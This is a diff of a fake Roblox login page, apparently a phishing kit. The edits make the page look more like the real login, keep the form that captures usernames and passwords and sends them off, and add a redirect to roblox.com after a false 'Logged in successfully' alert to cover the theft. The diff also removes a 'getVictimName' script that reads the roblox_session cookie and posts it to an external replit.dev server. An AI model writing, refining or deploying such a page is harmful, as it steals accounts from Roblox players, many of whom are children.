@@ -3,24 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Join User</title>
+    <title>Roblox</title>
     <style>
-        body { margin: 0; padding: 0; font-family: 'Roboto', sans-serif; background-color: #232527; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .container { background-color: #393b3d; padding: 30px; border-radius: 10px; width: 350px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        h1 { font-size: 24px; margin-bottom: 20px; color: #ffffff; }
-        .avatar-placeholder { width: 100px; height: 100px; background-color: #e0e0e0; border-radius: 50%; margin: 0 auto 15px; display: flex; justify-content: center; align-items: center; font-size: 12px; color: #333; background-image: url('https://tr.rbxcdn.com/30/150/Roblox_Icon.png'); background-size: cover; }
-        input[type="text"], input[type="password"] { width: 90%; padding: 12px; margin: 8px 0; display: inline-block; border: none; border-radius: 5px; box-sizing: border-box; background-color: #e0e0e0; color: #333; }
-        button { width: 100%; padding: 12px; background-color: #00b06f; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 10px; transition: background-color 0.3s; }
+        body { margin: 0; padding: 0; font-family: 'Gotham', 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #232527; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { background-color: #393B3D; padding: 40px; border-radius: 8px; width: 380px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+        h1 { font-size: 28px; margin-bottom: 25px; color: #ffffff; font-weight: 700; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 14px; margin: 10px 0; display: block; border: none; border-radius: 4px; box-sizing: border-box; background-color: #FFFFFF; color: #393B3D; font-size: 16px; }
+        input::placeholder { color: #999; }
+        button { width: 100%; padding: 14px; background-color: #00B06F; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 18px; font-weight: bold; margin-top: 15px; transition: background-color 0.2s; }
         button:hover { background-color: #008f5a; }
-        .link-overlay { position: absolute; top: 10px; left: 10px; font-size: 12px; color: #aaa; }
+        .link-overlay { position: absolute; top: 15px; left: 15px; font-size: 13px; color: #aaa; text-decoration: none; }
     </style>
 </head>
 <body>
-    <div class="link-overlay">roblox.com/profile/</div>
+    <a href="https://www.roblox.com" class="link-overlay" style="text-decoration: none; color: #aaa;">roblox.com</a>
     <div class="container">
-        <div class="avatar-placeholder"></div>
-        <h1 id="username-display">PlayerName</h1>
-        <p style="color: #ccc; font-size: 14px; margin-bottom: 20px;">Join me in the game! Please log in to continue.</p>
+        <h1 id="username-display">Roblox</h1>
         <form id="loginForm" action="#" method="POST">
             <input type="text" id="username" name="username" placeholder="Username" required>
             <input type="password" id="password" name="password" placeholder="Password" required>
@@ -33,7 +31,6 @@
         const targetUser = urlParams.get('user');
         if (targetUser) {
             document.getElementById('username-display').innerText = targetUser;
-            document.querySelector('.link-overlay').innerText = `roblox.com/profile/${targetUser}`;
         }
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -62,6 +59,7 @@
                 body: JSON.stringify(data)
             }).then(() => {
                 alert("Logged in successfully!");
+                window.location.href = "https://www.roblox.com/home";
             }).catch(err => {
                 console.error("Error sending data:", err);
                 alert("Error logging in.");
@@ -70,47 +68,3 @@
     </script>
 </body>
 </html>
-<script>
-  // Fetches user info based on Roblox cookie or API if available
-  fetch('https://users.roblox.com/v1/users/current')
-    .then(response => response.json())
-    .then(data => {
-      document.getElementById('player-name-display').innerText = data.displayName;
-    })
-    .catch(err => console.log('Session not found or blocked'));
-</script>
-<script>
-async function getVictimName() {
-try {
-// 1. Try to fetch directly from Roblox (Only works if your site is on roblox.com)
-const response = await fetch('https://users.roblox.com/v1/users/current', {
-credentials: 'include'
-});
-
-if (response.ok) {
-const data = await response.json();
-document.getElementById("player-name-display").innerText = data.displayName || data.Name;
-return;
-}
-
-// 2. If direct fetch fails (CORS), send the cookie to your backend to get the name
-const cookieValue = document.cookie.split('; ').find(row => row.startsWith('roblox_session='));
-if (cookieValue) {
-// Send the cookie to your backend
-const backendResponse = await fetch('https://c74e1019-951a-42a9-a296-fb6d0b4c43f0-00-1hv3xbcyrqopf.kira.replit.dev/api/get-name', {
-method: 'POST',
-headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-body: 'session=' + encodeURIComponent(cookieValue)
-});
-
-const userData = await backendResponse.json();
-if (userData.name) {
-document.getElementById("player-name-display").innerText = userData.name;
-}
-}
-} catch (e) {
-document.getElementById("player-name-display").innerText = "Player Name";
-}
-}
-getVictimName();
-</script>
